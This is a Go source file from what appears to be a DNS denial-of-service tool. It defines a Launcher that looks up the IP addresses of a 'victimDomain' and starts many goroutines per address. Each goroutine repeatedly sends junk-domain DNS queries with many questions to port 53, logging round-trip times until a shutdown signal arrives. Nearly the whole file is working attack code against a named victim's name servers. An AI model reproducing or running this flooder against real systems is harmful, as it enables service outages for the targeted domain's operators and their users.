package internal

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

type Launcher struct {
	nRoutines    int
	nQuestions   int
	ipAddresses  []net.IP
	victimDomain string
	sleepTime    *time.Duration
	stop         chan struct{}
	wg           sync.WaitGroup
}

func NewLauncher(nRoutines, nQuestions int, victimDomain string, sleep *time.Duration) Launcher {
	return Launcher{
		nRoutines:    nRoutines,
		nQuestions:   nQuestions,
		ipAddresses:  make([]net.IP, 0),
		victimDomain: victimDomain,
		sleepTime:    sleep,
		stop:         make(chan struct{}),
	}
}

func (l *Launcher) Start() {
	for _, ipAddress := range l.ipAddresses {
		for i := 0; i < l.nRoutines; i++ {
			l.wg.Add(1)
			go l.runner(ipAddress.String())
		}
	}
}

func (l *Launcher) Initialize() {
	var err error
	l.ipAddresses, err = net.LookupIP(l.victimDomain)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not get IPs: %v\n", err)
		os.Exit(1)
	}
}

func (l *Launcher) runner(ipString string) {
	client := NewDNSClient(fmt.Sprintf("%s:53", ipString))
	for {
		rtt, dnsErr, err := client.SendJunkDomainsRequest(l.nQuestions, l.victimDomain)
		errorMessage := "none"
		if err != nil {
			errorMessage = err.Error()
		}
		if dnsErr == "" {
			dnsErr = "none"
		}
		log.Printf("RTT: %-12s, DNS_ERR: %-8s, NET_ERR: %s", rtt.String(), dnsErr, errorMessage)
		if l.sleepTime != nil {
			time.Sleep(*l.sleepTime)
		}
		select {
		case _, ok := <-l.stop:
			if !ok {
				l.wg.Done()
				return
			}
		default:
		}
	}
}

func (l *Launcher) AwaitShutdown() {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(
		sigChan,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGTERM,
		syscall.SIGQUIT,
	)
	<-sigChan
}

func (l *Launcher) Stop() {
	close(l.stop)
	l.wg.Wait()
}
